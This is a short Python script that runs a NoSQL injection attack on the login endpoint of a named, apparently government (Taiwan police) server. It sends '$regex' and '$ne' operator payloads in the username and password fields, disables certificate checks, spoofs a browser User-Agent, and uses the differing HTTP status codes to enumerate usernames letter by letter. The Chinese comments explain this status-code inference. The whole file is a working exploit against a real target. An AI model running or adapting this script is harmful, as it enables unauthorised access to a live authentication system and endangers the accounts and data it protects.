import requests, urllib3, time, string
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code

print("=== 大写首字母 $regex (单文档=500, >=2=403) ===")
print("注: 若某首字母下恰好有1个文档 -> 500; 需结合'排除法'")
for c in string.ascii_uppercase:
    body={"username":{"$regex":"^"+c},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    sc=login(body); time.sleep(0.04)
    flag="<== >=2" if sc==403 else ""
    print(f"  ^{c} -> {sc} {flag}")
